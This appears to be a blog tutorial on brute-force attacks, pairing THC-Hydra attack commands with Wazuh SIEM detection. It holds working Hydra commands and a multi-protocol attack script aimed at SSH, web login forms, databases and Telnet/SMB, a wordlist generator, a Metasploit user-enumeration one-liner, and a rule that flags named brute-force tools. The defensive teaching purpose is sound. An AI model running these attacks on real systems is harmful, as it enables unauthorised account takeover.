---
author: Anubhav Gain
pubDatetime: 2025-01-02T10:30:00+05:30
modDatetime: 2025-01-02T10:30:00+05:30
title: "Mastering Brute-Force Attack Detection: Complete Guide to Hydra Attacks and Wazuh SIEM Defense"
slug: brute-force-attack-detection-wazuh-hydra-2025
featured: true
draft: false
tags:
  - SIEM
  - Wazuh
  - brute-force
  - Hydra
  - SSH-security
  - attack-detection
  - incident-response
  - penetration-testing
  - security-monitoring
  - active-response
  - cybersecurity
  - threat-hunting
  - authentication-security
  - network-security
  - SOC
category: SIEM
description: "A comprehensive guide to understanding, simulating, and detecting brute-force attacks using Hydra and defending against them with Wazuh SIEM. Includes hands-on labs, detection rules, active response configurations, and real-world incident response strategies for 2025."
---

# Mastering Brute-Force Attack Detection: Complete Guide to Hydra Attacks and Wazuh SIEM Defense

## Table of Contents

## Introduction: The Persistent Threat of Brute-Force Attacks

In the cybersecurity landscape of 2025, brute-force attacks remain one of the most persistent and dangerous threats facing organizations worldwide. Despite advances in security technology, **over 80% of data breaches still involve compromised credentials**, with brute-force attacks being a primary vector. These attacks are not sophisticated—they're primitive, loud, and predictable. Yet they succeed with alarming frequency.

This comprehensive guide takes you through the entire lifecycle of brute-force attacks: from understanding the attacker's perspective using tools like **Hydra**, to building robust defenses with **Wazuh SIEM**, and finally to incident response and recovery. We'll combine red team tactics with blue team strategies to create a complete picture of this critical security challenge.

### Why Brute-Force Attacks Still Work in 2025

Despite decades of security awareness:
- **65% of users** reuse passwords across multiple accounts
- **Default credentials** remain unchanged in 30% of installations
- **Weak passwords** like "Password123!" still meet many complexity requirements
- **Rate limiting** is absent or poorly configured in 40% of services
- **Account lockout policies** are often disabled to reduce helpdesk tickets

## Part 1: Understanding Brute-Force Attacks

### The Anatomy of a Brute-Force Attack

A brute-force attack is a trial-and-error method where an attacker systematically attempts all possible combinations of credentials until the correct one is found. It's the digital equivalent of trying every key on a massive keyring until one opens the lock.

#### Types of Brute-Force Attacks

```
1. Simple Brute-Force
   └─> Tries all possible character combinations
   └─> Time: Years for complex passwords
   └─> Example: aaaa, aaab, aaac...

2. Dictionary Attack
   └─> Uses pre-compiled wordlists
   └─> Time: Minutes to hours
   └─> Example: password, 123456, admin...

3. Hybrid Attack
   └─> Combines dictionary with rules
   └─> Time: Hours to days
   └─> Example: Password1, Password2024, P@ssw0rd...

4. Credential Stuffing
   └─> Uses leaked credential databases
   └─> Time: Seconds to minutes
   └─> Example: user@email.com:leaked_password

5. Rainbow Table Attack
   └─> Pre-computed hash lookups
   └─> Time: Seconds
   └─> Example: Hash → Password mapping

6. Reverse Brute-Force
   └─> One password, many usernames
   └─> Time: Variable
   └─> Example: Common password against all users
```

### The Mathematics of Brute-Force

Understanding the math helps appreciate both attack and defense strategies:

```
Password Space = Character_Set_Size ^ Password_Length

Examples:
- 8-char lowercase: 26^8 = 208 billion combinations
- 8-char alphanumeric: 62^8 = 218 trillion combinations
- 8-char all ASCII: 95^8 = 6.6 quadrillion combinations

Time to Crack (at 1000 attempts/second):
- 8-char lowercase: ~2.4 days
- 8-char alphanumeric: ~6,900 years
- 8-char all ASCII: ~209,000 years

But with modern GPUs (10 billion attempts/second):
- 8-char lowercase: ~20 seconds
- 8-char alphanumeric: ~6 hours
- 8-char all ASCII: ~7.6 days
```

### Common Attack Vectors

#### 1. SSH (Secure Shell)
```bash
# Most commonly attacked service
Port: 22 (default)
Targets: Linux servers, network devices, IoT
Success Rate: 23% with default/weak credentials
Average Attempts: 2,000-10,000 per attack
```

#### 2. RDP (Remote Desktop Protocol)
```bash
Port: 3389 (default)
Targets: Windows servers, workstations
Success Rate: 31% with default/weak credentials
Average Attempts: 5,000-20,000 per attack
```

#### 3. Web Applications
```bash
Targets: Login forms, API endpoints
Common: WordPress, Joomla, custom CMSs
Success Rate: 18% overall
Average Attempts: 1,000-50,000 per attack
```

#### 4. Database Services
```bash
MySQL: Port 3306
PostgreSQL: Port 5432
MSSQL: Port 1433
MongoDB: Port 27017
Success Rate: 42% with default credentials
```

## Part 2: Hydra - The Attacker's Swiss Army Knife

### What is Hydra?

**Hydra** (or THC-Hydra) is one of the most powerful and flexible password-cracking tools available. It's a parallelized login cracker that supports numerous protocols and services. Think of it as a battering ram that can simultaneously hit multiple doors with different keys at incredible speed.

### Hydra's Capabilities

```
Supported Protocols (50+):
├── Network Services
│   ├── SSH, Telnet, FTP, FTPS
│   ├── HTTP/HTTPS (GET, POST, Forms)
│   ├── SMB, SMB2, SMBNT
│   └── LDAP, LDAPS
├── Database Services
│   ├── MySQL, PostgreSQL
│   ├── Oracle, MSSQL
│   └── MongoDB, Redis
├── Mail Services
│   ├── POP3, POP3S
│   ├── IMAP, IMAPS
│   └── SMTP, SMTPS
├── Remote Access
│   ├── RDP, VNC
│   ├── Rlogin, RSH
│   └── TeamSpeak
└── Other Services
    ├── SNMP, SIP
    ├── XMPP, IRC
    └── Asterisk, AFP
```

### Installing and Configuring Hydra

#### Installation on Various Platforms

```bash
# Kali Linux (Pre-installed)
apt update && apt install hydra hydra-gtk

# Ubuntu/Debian
sudo apt update
sudo apt install hydra hydra-gtk

# CentOS/RHEL/Fedora
sudo dnf install hydra
# or compile from source
git clone https://github.com/vanhauser-thc/thc-hydra.git
cd thc-hydra
./configure
make
sudo make install

# macOS
brew install hydra

# Windows (via WSL or Cygwin)
# Use WSL and follow Ubuntu instructions
```

### Hydra Command-Line Mastery

#### Basic Syntax
```bash
hydra [options] target protocol [module-options]

Options:
-l LOGIN    : Single username
-L FILE     : Username list
-p PASS     : Single password
-P FILE     : Password list
-t TASKS    : Parallel connections (default: 16)
-f          : Exit on first valid credentials
-v/-V       : Verbose output
-o FILE     : Output results to file
-M FILE     : List of servers to attack
-C FILE     : Colon-separated login:pass file
-x MIN:MAX:CHARSET : Password generation
-e nsr      : n=null, s=same, r=reverse
-u          : Loop users for each password
-s PORT     : Custom port
-S          : Use SSL/TLS
-O          : Use old SSL v2/v3
-I          : Ignore restore file
-4/-6       : Force IPv4/IPv6
```

#### Advanced Hydra Attack Scenarios

##### Scenario 1: SSH Brute-Force Attack
```bash
# Simple SSH attack with single user
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# Multiple users with common passwords
hydra -L users.txt -P passwords.txt ssh://192.168.1.100 -t 4

# Using password generation
hydra -l admin -x 6:8:aA1 ssh://192.168.1.100
# Generates passwords 6-8 chars with lowercase, uppercase, numbers

# With specific port and verbose output
hydra -l root -P passwords.txt -s 2222 -v ssh://192.168.1.100

# Attack multiple servers
hydra -l root -P passwords.txt -M targets.txt ssh

# Using proxy
hydra -l admin -P passwords.txt ssh://192.168.1.100 \
  -e nsr -o results.txt \
  -t 64 -w 30 \
  -m "exec:/usr/bin/proxychains"
```

##### Scenario 2: Web Form Attack
```bash
# Basic HTTP POST form
hydra -l admin -P passwords.txt 192.168.1.100 \
  http-post-form \
  "/login.php:username=^USER^&password=^PASS^:Invalid credentials"

# WordPress login
hydra -L users.txt -P passwords.txt 192.168.1.100 \
  http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:ERROR"

# With cookies and additional headers
hydra -l admin -P passwords.txt 192.168.1.100 \
  http-post-form \
  "/admin/login:user=^USER^&pass=^PASS^:Failed" \
  -H "Cookie: PHPSESSID=abc123" \
  -H "X-Forwarded-For: 127.0.0.1"

# HTTPS with form
hydra -l admin -P passwords.txt -S 192.168.1.100 \
  https-post-form \
  "/secure/login:username=^USER^&password=^PASS^:incorrect"
```

##### Scenario 3: Database Attacks
```bash
# MySQL attack
hydra -L users.txt -P passwords.txt mysql://192.168.1.100

# PostgreSQL with custom port
hydra -l postgres -P passwords.txt -s 5433 postgres://192.168.1.100

# MSSQL attack
hydra -L users.txt -P passwords.txt mssql://192.168.1.100

# MongoDB (if authentication enabled)
hydra -l admin -P passwords.txt mongodb://192.168.1.100:27017
```

##### Scenario 4: Multi-Protocol Attack Campaign
```bash
#!/bin/bash
# Comprehensive attack script

TARGET="192.168.1.100"
USERLIST="users.txt"
PASSLIST="passwords.txt"
OUTPUT_DIR="hydra_results"

mkdir -p $OUTPUT_DIR

# SSH Attack
echo "[*] Starting SSH brute-force..."
hydra -L $USERLIST -P $PASSLIST -t 4 -f \
  -o $OUTPUT_DIR/ssh_results.txt \
  ssh://$TARGET

# FTP Attack
echo "[*] Starting FTP brute-force..."
hydra -L $USERLIST -P $PASSLIST -t 6 \
  -o $OUTPUT_DIR/ftp_results.txt \
  ftp://$TARGET

# Telnet Attack
echo "[*] Starting Telnet brute-force..."
hydra -L $USERLIST -P $PASSLIST -t 16 \
  -o $OUTPUT_DIR/telnet_results.txt \
  telnet://$TARGET

# SMB Attack
echo "[*] Starting SMB brute-force..."
hydra -L $USERLIST -P $PASSLIST -t 1 \
  -o $OUTPUT_DIR/smb_results.txt \
  smb://$TARGET

# Web Form Attack
echo "[*] Starting Web form brute-force..."
hydra -L $USERLIST -P $PASSLIST \
  -o $OUTPUT_DIR/web_results.txt \
  $TARGET http-post-form \
  "/login:user=^USER^&pass=^PASS^:Failed"

echo "[*] Attack complete. Results in $OUTPUT_DIR"
```

### XHydra - The GUI Alternative

XHydra provides a graphical interface for Hydra, making it more accessible for users who prefer GUI over command-line.

#### XHydra Configuration Steps

```bash
# Launch XHydra
xhydra &

# Configuration Process:
1. Target Tab:
   ├── Single Target: Enter IP/hostname
   ├── Target List: Load from file
   ├── Port: Service-specific port
   ├── Protocol: Select from dropdown
   ├── SSL: Check if using HTTPS/SSL
   └── Show Attempts: Verbose output

2. Passwords Tab:
   ├── Username: Single or list
   ├── Password: Single or list
   ├── Colon File: user:pass format
   ├── Try login as password
   ├── Try empty password
   └── Try reverse login

3. Tuning Tab:
   ├── Tasks: Parallel connections (1-64)
   ├── Timeout: Connection timeout
   ├── Wait time: Between attempts
   └── Exit after first found

4. Specific Tab:
   └── Protocol-specific options

5. Start Tab:
   └── Click "Start" to begin attack
```

### Creating Effective Wordlists

#### Common Wordlist Sources
```bash
# Pre-installed wordlists in Kali
/usr/share/wordlists/
├── rockyou.txt         # 14 million passwords
├── dirb/              # Directory names
├── dirbuster/         # Web paths
├── fasttrack.txt      # Common passwords
├── fern-wifi/         # WiFi passwords
├── metasploit/        # Various lists
├── nmap.lst          # Nmap scripts
├── SecLists/         # Comprehensive collection
└── wfuzz/            # Fuzzing wordlists

# Download SecLists (most comprehensive)
git clone https://github.com/danielmiessler/SecLists.git

# Common password patterns
cat > custom_passwords.txt << EOF
Password1
Password123
Password2024
Password2025
Admin123
Admin@123
Welcome123
Company2024
Summer2024
Winter2025
Qwerty123
Letmein123
EOF
```

#### Generating Custom Wordlists
```python
#!/usr/bin/env python3
# Custom wordlist generator

import itertools
import argparse

def generate_passwords(base_word, years, special_chars, numbers):
    """Generate password variations based on patterns"""
    passwords = []
    
    # Base variations
    variations = [
        base_word,
        base_word.lower(),
        base_word.upper(),
        base_word.capitalize()
    ]
    
    # Add years
    for var in variations:
        for year in years:
            passwords.append(f"{var}{year}")
            passwords.append(f"{var}@{year}")
            passwords.append(f"{var}_{year}")
    
    # Add common substitutions
    leetspeak = {
        'a': '@', 'e': '3', 'i': '1', 
        'o': '0', 's': '$', 't': '7'
    }
    
    for var in variations:
        leet = var
        for old, new in leetspeak.items():
            leet = leet.replace(old, new)
        passwords.append(leet)
    
    # Add special characters and numbers
    for var in variations:
        for char in special_chars:
            for num in numbers:
                passwords.append(f"{var}{char}{num}")
                passwords.append(f"{var}{num}{char}")
    
    return list(set(passwords))  # Remove duplicates

# Usage
base_words = ["Password", "Admin", "Company", "Welcome"]
years = ["2023", "2024", "2025"]
special = ["!", "@", "#", "$"]
numbers = ["1", "12", "123", "1234"]

all_passwords = []
for word in base_words:
    all_passwords.extend(
        generate_passwords(word, years, special, numbers)
    )

# Save to file
with open('custom_wordlist.txt', 'w') as f:
    for pwd in all_passwords:
        f.write(f"{pwd}\n")

print(f"Generated {len(all_passwords)} passwords")
```

## Part 3: Wazuh SIEM - Your Defense Command Center

### Understanding Wazuh's Detection Capabilities

Wazuh operates as a comprehensive security platform that goes beyond simple log collection. It provides:

```
Detection Layers:
├── Log Analysis
│   ├── Pattern matching
│   ├── Correlation rules
│   └── Statistical analysis
├── File Integrity Monitoring
│   ├── Critical file changes
│   ├── Registry monitoring (Windows)
│   └── Permission changes
├── Vulnerability Detection
│   ├── CVE scanning
│   ├── Configuration assessment
│   └── Compliance checking
├── Threat Intelligence
│   ├── IP reputation
│   ├── Hash lookups
│   └── MITRE ATT&CK mapping
└── Active Response
    ├── Automated blocking
    ├── Script execution
    └── Integration triggers
```

### Configuring Wazuh for Brute-Force Detection

#### Manager Configuration
```xml
<!-- /var/ossec/etc/ossec.conf -->
<ossec_config>
  <!-- Global settings for brute-force detection -->
  <global>
    <email_notification>yes</email_notification>
    <email_to>soc@company.com</email_to>
    <smtp_server>mail.company.com</smtp_server>
    <email_from>wazuh@company.com</email_from>
    <email_maxperhour>100</email_maxperhour>
    <white_list>127.0.0.1</white_list>
    <white_list>^192\.168\.1\.</white_list>
  </global>

  <!-- Alerts configuration -->
  <alerts>
    <log_alert_level>5</log_alert_level>
    <email_alert_level>10</email_alert_level>
  </alerts>

  <!-- Enhanced logging for forensics -->
  <logging>
    <log_format>json</log_format>
    <jsonout_output>yes</jsonout_output>
    <alerts_log>yes</alerts_log>
    <logall>yes</logall>
    <logall_json>yes</logall_json>
  </logging>

  <!-- Syslog output for SIEM integration -->
  <syslog_output>
    <level>5</level>
    <server>siem.company.com</server>
    <port>514</port>
    <format>json</format>
  </syslog_output>

  <!-- Active Response Configuration -->
  <active-response>
    <disabled>no</disabled>
    <ca_store>/var/ossec/etc/wpk_root.pem</ca_store>
    <ca_verification>yes</ca_verification>
  </active-response>

  <!-- Command definitions for active response -->
  <command>
    <name>firewall-drop</name>
    <executable>firewall-drop</executable>
    <timeout_allowed>yes</timeout_allowed>
  </command>

  <command>
    <name>host-deny</name>
    <executable>host-deny</executable>
    <timeout_allowed>yes</timeout_allowed>
  </command>

  <command>
    <name>route-null</name>
    <executable>route-null</executable>
    <timeout_allowed>yes</timeout_allowed>
  </command>

  <command>
    <name>win_route-null</name>
    <executable>route-null.exe</executable>
    <timeout_allowed>yes</timeout_allowed>
  </command>

  <!-- Active response definitions -->
  <active-response>
    <command>firewall-drop</command>
    <location>local</location>
    <rules_id>5763</rules_id>
    <timeout>3600</timeout>
  </active-response>

  <active-response>
    <command>firewall-drop</command>
    <location>local</location>
    <rules_id>5710,5711,5712</rules_id>
    <timeout>1800</timeout>
  </active-response>

  <!-- Enhanced rules for brute-force -->
  <rules>
    <include>rules/0010-rules_config.xml</include>
    <include>rules/0015-ossec_rules.xml</include>
    <include>rules/0016-wazuh_rules.xml</include>
    <include>rules/0020-syslog_rules.xml</include>
    <include>rules/0025-sendmail_rules.xml</include>
    <include>rules/0030-postfix_rules.xml</include>
    <include>rules/0035-spamd_rules.xml</include>
    <include>rules/0040-imapd_rules.xml</include>
    <include>rules/0045-mailscanner_rules.xml</include>
    <include>rules/0050-ms-exchange_rules.xml</include>
    <include>rules/0095-sshd_rules.xml</include>
    <include>rules/0220-msauth_rules.xml</include>
    <include>local_rules/brute_force_rules.xml</include>
  </rules>
</ossec_config>
```

### Custom Brute-Force Detection Rules

#### Advanced Rule Development
```xml
<!-- /var/ossec/etc/rules/local_rules/brute_force_rules.xml -->
<group name="brute_force,authentication">

  <!-- SSH Brute-Force Detection Rules -->
  
  <!-- Rule: Detect SSH authentication failures -->
  <rule id="100100" level="5">
    <if_sid>5716</if_sid>
    <match>Failed password for</match>
    <description>SSH authentication failed</description>
    <group>authentication_failed,ssh,</group>
  </rule>

  <!-- Rule: Multiple SSH failures from same source -->
  <rule id="100101" level="10" frequency="5" timeframe="120">
    <if_matched_sid>100100</if_matched_sid>
    <same_source_ip />
    <description>Multiple SSH authentication failures from same source</description>
    <group>authentication_failures,brute_force,ssh,</group>
    <mitre>
      <id>T1110.001</id>
      <id>T1078</id>
    </mitre>
  </rule>

  <!-- Rule: SSH brute-force attack detected -->
  <rule id="100102" level="14" frequency="10" timeframe="120">
    <if_matched_sid>100100</if_matched_sid>
    <same_source_ip />
    <description>SSH brute-force attack in progress</description>
    <group>authentication_failures,brute_force_attack,ssh,incident,</group>
    <mitre>
      <id>T1110.001</id>
    </mitre>
  </rule>

  <!-- Rule: Distributed SSH brute-force -->
  <rule id="100103" level="12" frequency="20" timeframe="300">
    <if_matched_sid>100100</if_matched_sid>
    <different_source_ip />
    <same_dst_port />
    <description>Possible distributed SSH brute-force attack</description>
    <group>authentication_failures,distributed_attack,ssh,</group>
  </rule>

  <!-- Rule: Successful login after brute-force -->
  <rule id="100104" level="15">
    <if_sid>5715</if_sid>
    <if_matched_sid>100102</if_matched_sid>
    <same_source_ip />
    <description>CRITICAL: Successful SSH login after brute-force attack</description>
    <group>authentication_success,brute_force_success,compromise,ssh,</group>
    <mitre>
      <id>T1078</id>
      <id>T1110.001</id>
    </mitre>
  </rule>

  <!-- Web Application Brute-Force Rules -->
  
  <!-- Rule: HTTP authentication failure -->
  <rule id="100110" level="5">
    <if_sid>31108</if_sid>
    <match>401|403|Failed login|Invalid credentials</match>
    <description>Web authentication failure detected</description>
    <group>web,authentication_failed,</group>
  </rule>

  <!-- Rule: Web form brute-force -->
  <rule id="100111" level="10" frequency="10" timeframe="60">
    <if_matched_sid>100110</if_matched_sid>
    <same_source_ip />
    <description>Web form brute-force attack detected</description>
    <group>web,authentication_failures,brute_force,</group>
  </rule>

  <!-- Rule: WordPress specific brute-force -->
  <rule id="100112" level="11" frequency="5" timeframe="60">
    <if_sid>31108</if_sid>
    <match>wp-login.php|xmlrpc.php</match>
    <same_source_ip />
    <description>WordPress brute-force attack detected</description>
    <group>web,wordpress,brute_force,</group>
  </rule>

  <!-- Database Brute-Force Rules -->
  
  <!-- Rule: MySQL authentication failure -->
  <rule id="100120" level="5">
    <decoded_as>mysql</decoded_as>
    <match>Access denied for user</match>
    <description>MySQL authentication failure</description>
    <group>mysql,authentication_failed,</group>
  </rule>

  <!-- Rule: Database brute-force -->
  <rule id="100121" level="12" frequency="5" timeframe="60">
    <if_matched_sid>100120</if_matched_sid>
    <same_source_ip />
    <description>Database brute-force attack detected</description>
    <group>database,brute_force,</group>
  </rule>

  <!-- RDP Brute-Force Rules (Windows) -->
  
  <!-- Rule: RDP authentication failure -->
  <rule id="100130" level="5">
    <if_sid>60106</if_sid>
    <field name="win.eventdata.logonType">^10$</field>
    <description>RDP authentication failure</description>
    <group>windows,rdp,authentication_failed,</group>
  </rule>

  <!-- Rule: RDP brute-force -->
  <rule id="100131" level="12" frequency="5" timeframe="120">
    <if_matched_sid>100130</if_matched_sid>
    <same_source_ip />
    <description>RDP brute-force attack detected</description>
    <group>windows,rdp,brute_force,</group>
    <mitre>
      <id>T1110.001</id>
      <id>T1021.001</id>
    </mitre>
  </rule>

  <!-- Correlation Rules -->
  
  <!-- Rule: Multi-service brute-force -->
  <rule id="100140" level="14" frequency="15" timeframe="300">
    <if_group>authentication_failed</if_group>
    <same_source_ip />
    <description>Multi-service brute-force attack from single source</description>
    <group>brute_force,correlation,incident,</group>
  </rule>

  <!-- Rule: Credential stuffing pattern -->
  <rule id="100141" level="13" frequency="50" timeframe="60">
    <if_group>authentication_failed</if_group>
    <different_user />
    <same_source_ip />
    <description>Possible credential stuffing attack detected</description>
    <group>credential_stuffing,brute_force,</group>
  </rule>

  <!-- Rule: Slow brute-force detection -->
  <rule id="100142" level="8" frequency="10" timeframe="3600">
    <if_group>authentication_failed</if_group>
    <same_source_ip />
    <same_user />
    <description>Slow brute-force attack detected (low and slow)</description>
    <group>slow_brute_force,</group>
  </rule>

  <!-- Rule: Account lockout after brute-force -->
  <rule id="100143" level="9">
    <match>account locked|account disabled|too many failed attempts</match>
    <description>Account locked due to multiple failed attempts</description>
    <group>account_lockout,brute_force_defense,</group>
  </rule>

  <!-- Rule: Hydra tool detection -->
  <rule id="100150" level="13">
    <match>hydra|medusa|ncrack|patator|thc-hydra</match>
    <description>Known brute-force tool detected in logs</description>
    <group>brute_force_tool,attack_tool,</group>
  </rule>

  <!-- Rule: Unusual authentication pattern -->
  <rule id="100151" level="9" frequency="3" timeframe="10">
    <if_group>authentication_failed</if_group>
    <same_source_ip />
    <different_user />
    <description>Rapid authentication attempts with different usernames</description>
    <group>user_enumeration,brute_force,</group>
  </rule>

</group>
```

### Active Response Scripts

#### Enhanced Firewall Drop Script
```bash
#!/bin/bash
# /var/ossec/active-response/bin/firewall-drop.sh
# Enhanced firewall-drop with logging and notification

ACTION=$1
USER=$2
IP=$3
ALERTID=$4
RULEID=$5

LOG_FILE="/var/log/wazuh-active-response.log"
BLOCK_LIST="/var/ossec/logs/blocked_ips.txt"
WHITELIST="/var/ossec/etc/whitelist.txt"

# Function to log events
log_event() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $1" >> $LOG_FILE
}

# Function to send notification
send_notification() {
    local message=$1
    # Email notification
    echo "$message" | mail -s "Wazuh Active Response: IP Blocked" soc@company.com
    
    # Slack notification (optional)
    curl -X POST -H 'Content-type: application/json' \
        --data "{\"text\":\"$message\"}" \
        https://hooks.slack.com/services/YOUR/SLACK/WEBHOOK
}

# Check if IP is whitelisted
is_whitelisted() {
    if grep -q "^$1$" $WHITELIST 2>/dev/null; then
        return 0
    fi
    return 1
}

# Main logic
main() {
    # Check whitelist
    if is_whitelisted $IP; then
        log_event "Skipped whitelisted IP: $IP"
        exit 0
    fi

    case $ACTION in
        add)
            # Add firewall rule
            iptables -I INPUT -s $IP -j DROP
            iptables -I FORWARD -s $IP -j DROP
            
            # Add to blocked list
            echo "$IP|$(date)|$ALERTID|$RULEID" >> $BLOCK_LIST
            
            # Log event
            log_event "Blocked IP: $IP (Rule: $RULEID, Alert: $ALERTID)"
            
            # Send notification
            send_notification "Brute-force attack detected and blocked
IP Address: $IP
Rule ID: $RULEID
Alert ID: $ALERTID
Time: $(date)
Action: IP has been blocked for 1 hour"
            
            # Optional: Add to fail2ban
            fail2ban-client set sshd banip $IP 2>/dev/null
            
            # Optional: Update GeoIP database
            geoiplookup $IP >> $LOG_FILE 2>&1
            ;;
            
        delete)
            # Remove firewall rule
            iptables -D INPUT -s $IP -j DROP 2>/dev/null
            iptables -D FORWARD -s $IP -j DROP 2>/dev/null
            
            # Log event
            log_event "Unblocked IP: $IP"
            
            # Optional: Remove from fail2ban
            fail2ban-client set sshd unbanip $IP 2>/dev/null
            ;;
            
        *)
            log_event "Invalid action: $ACTION"
            exit 1
            ;;
    esac
}

# Execute main function
main

exit 0
```

#### Advanced Host Deny Script
```bash
#!/bin/bash
# /var/ossec/active-response/bin/enhanced-host-deny.sh
# Advanced host-deny with multiple blocking methods

ACTION=$1
USER=$2
IP=$3
ALERTID=$4
RULEID=$5

HOSTS_DENY="/etc/hosts.deny"
NGINX_BLOCK="/etc/nginx/blocked_ips.conf"
APACHE_BLOCK="/etc/apache2/blocked_ips.conf"
LOG_FILE="/var/log/wazuh-host-deny.log"

# Function to block via hosts.deny
block_hosts_deny() {
    echo "ALL: $1" >> $HOSTS_DENY
    echo "sshd: $1" >> $HOSTS_DENY
    echo "vsftpd: $1" >> $HOSTS_DENY
}

# Function to block via nginx
block_nginx() {
    echo "deny $1;" >> $NGINX_BLOCK
    nginx -t && nginx -s reload
}

# Function to block via apache
block_apache() {
    echo "Require not ip $1" >> $APACHE_BLOCK
    apache2ctl configtest && apache2ctl graceful
}

# Function to create honeypot redirect
create_honeypot() {
    # Redirect attacker to honeypot
    iptables -t nat -A PREROUTING -s $1 -j DNAT --to-destination 10.0.0.100
}

# Main execution
case $ACTION in
    add)
        echo "$(date): Blocking $IP (Rule: $RULEID)" >> $LOG_FILE
        
        # Multiple blocking methods
        block_hosts_deny $IP
        block_nginx $IP
        block_apache $IP
        
        # Optional: Redirect to honeypot
        # create_honeypot $IP
        
        # Log to syslog
        logger -t wazuh-active-response "Blocked IP $IP due to rule $RULEID"
        ;;
        
    delete)
        echo "$(date): Unblocking $IP" >> $LOG_FILE
        
        # Remove from hosts.deny
        sed -i "/$IP/d" $HOSTS_DENY
        
        # Remove from nginx
        sed -i "/$IP/d" $NGINX_BLOCK
        nginx -t && nginx -s reload
        
        # Remove from apache
        sed -i "/$IP/d" $APACHE_BLOCK
        apache2ctl configtest && apache2ctl graceful
        
        # Remove honeypot redirect
        iptables -t nat -D PREROUTING -s $IP -j DNAT --to-destination 10.0.0.100 2>/dev/null
        ;;
esac

exit 0
```

## Part 4: Real-Time Attack Simulation and Detection

### Setting Up the Lab Environment

#### Network Architecture
```
Attack Lab Setup:
┌─────────────────────────────────────────────────┐
│                 Attack Network                   │
│                 192.168.100.0/24                │
├─────────────────────────────────────────────────┤
│                                                  │
│  ┌──────────────┐         ┌──────────────┐     │
│  │  Kali Linux  │         │   Target     │     │
│  │  Attacker    │────────▶│   Server     │     │
│  │ 192.168.100.10│        │192.168.100.50│     │
│  └──────────────┘         └──────────────┘     │
│         │                          │            │
│         │                          │            │
│         └──────────┬───────────────┘            │
│                    │                            │
│            ┌───────▼────────┐                   │
│            │  Wazuh SIEM    │                   │
│            │   Manager      │                   │
│            │192.168.100.100 │                   │
│            └────────────────┘                   │
│                    │                            │
│            ┌───────▼────────┐                   │
│            │  Wazuh         │                   │
│            │  Dashboard     │                   │
│            │192.168.100.101 │                   │
│            └────────────────┘                   │
└─────────────────────────────────────────────────┘
```

#### Preparing the Target System
```bash
#!/bin/bash
# Prepare vulnerable target system for testing

# Install SSH server with weak configuration
apt update && apt install -y openssh-server

# Create test users with weak passwords
users=("admin" "test" "user" "demo" "guest")
passwords=("admin123" "password" "123456" "test123" "guest")

for i in ${!users[@]}; do
    useradd -m -s /bin/bash ${users[$i]}
    echo "${users[$i]}:${passwords[$i]}" | chpasswd
    echo "Created user: ${users[$i]} with password: ${passwords[$i]}"
done

# Configure SSH for testing (INSECURE - LAB ONLY)
cat >> /etc/ssh/sshd_config << EOF
# Lab configuration - INSECURE
PermitRootLogin yes
PasswordAuthentication yes
PermitEmptyPasswords no
MaxAuthTries 6
MaxSessions 10
LoginGraceTime 120
StrictModes yes
PubkeyAuthentication yes
AuthorizedKeysFile .ssh/authorized_keys
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem sftp /usr/lib/openssh/sftp-server
EOF

# Restart SSH service
systemctl restart sshd

# Install Wazuh agent
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | apt-key add -
echo "deb https://packages.wazuh.com/4.x/apt/ stable main" | tee /etc/apt/sources.list.d/wazuh.list
apt update
WAZUH_MANAGER="192.168.100.100" apt install -y wazuh-agent

# Start Wazuh agent
systemctl start wazuh-agent
systemctl enable wazuh-agent

echo "Target system prepared for testing"
```

### Executing the Attack

#### Step-by-Step Attack Simulation
```bash
# 1. Reconnaissance Phase
nmap -sV -p22 192.168.100.50
nmap -sC -sV -O 192.168.100.50

# 2. User Enumeration (if possible)
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_enumusers; \
  set RHOSTS 192.168.100.50; \
  set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt; \
  run; exit"

# 3. Launch Hydra Attack
# Attack with username list and password list
hydra -L /usr/share/wordlists/metasploit/unix_users.txt \
      -P /usr/share/wordlists/rockyou.txt \
      -t 16 -v \
      -o hydra_results.txt \
      ssh://192.168.100.50

# 4. Monitor attack progress
watch -n 1 'grep -c "^" hydra_results.txt'

# 5. Attempt with found credentials
ssh admin@192.168.100.50
```

### Monitoring the Attack in Wazuh

#### Real-Time Detection Dashboard

Access the Wazuh dashboard at `https://192.168.100.101:5601`

```
Dashboard Views for Brute-Force Monitoring:

1. Security Events Dashboard
   ├── Top Alerts: Shows "Multiple authentication failures"
   ├── Alert Trend: Spike in authentication events
   ├── Top Source IPs: Attacker IP prominent
   └── Alert Level Distribution: High/Critical alerts

2. Threat Hunting Module
   ├── Query: rule.id:(5710 OR 5712 OR 5716 OR 5763)
   ├── Time Range: Last 15 minutes
   ├── Fields: source.ip, user.name, rule.description
   └── Visualization: Timeline and heat map

3. Integrity Monitoring
   ├── File Changes: /etc/passwd, /etc/shadow
   ├── SSH Config: /etc/ssh/sshd_config
   └── Log Files: /var/log/auth.log

4. Active Response
   ├── Blocked IPs: List of auto-blocked attackers
   ├── Response Actions: Firewall rules applied
   └── Effectiveness: Before/after attack metrics
```

#### Key Metrics to Monitor
```yaml
Attack Detection Metrics:
  Authentication Failures:
    - Rate: 100-1000 attempts/minute during attack
    - Pattern: Sequential or random usernames
    - Source: Single IP or distributed
    
  Alert Generation:
    - Rule 5716: SSH authentication failed (Level 5)
    - Rule 5710: Multiple failed logins (Level 8)
    - Rule 5712: Brute force attack detected (Level 10)
    - Rule 5763: Active response triggered (Level 12)
    
  System Impact:
    - CPU Usage: +10-30% during attack
    - Network Traffic: +500KB/s - 2MB/s
    - Log Growth: +10-50MB/hour
    - Memory Usage: +50-200MB
    
  Response Metrics:
    - Detection Time: 5-30 seconds
    - Blocking Time: 10-60 seconds
    - False Positive Rate: <5%
    - True Positive Rate: >95%
```

### Advanced Detection Queries

#### Elasticsearch/OpenSearch Queries for Analysis
```json
// Query 1: Find all SSH authentication failures
{
  "query": {
    "bool": {
      "must": [
        {
          "term": {
            "rule.groups": "sshd"
          }
        },
        {
          "match": {
            "rule.description": "authentication failed"
          }
        },
        {
          "range": {
            "@timestamp": {
              "gte": "now-1h"
            }
          }
        }
      ]
    }
  },
  "aggs": {
    "by_source_ip": {
      "terms": {
        "field": "data.srcip",
        "size": 10
      },
      "aggs": {
        "by_username": {
          "terms": {
            "field": "data.dstuser",
